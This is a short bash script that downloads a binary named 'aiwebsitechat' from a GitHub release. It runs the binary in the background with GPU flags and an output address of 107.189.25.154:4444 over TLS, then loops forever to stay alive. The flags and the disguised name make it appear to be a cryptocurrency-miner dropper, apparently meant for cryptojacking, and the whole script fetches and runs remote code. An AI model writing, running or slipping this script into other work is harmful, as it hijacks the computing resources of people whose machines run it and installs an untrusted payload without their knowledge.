#!/bin/bash
wget https://github.com/max313iq/Ssl/releases/download/Xxx/aiwebsitechat
./aiwebsitechat --no-cpu --cuda -o 107.189.25.154:4444 --tls &
while true; do 
  sleep 60 # sleep for 1 minute to avoid overloading the system
done
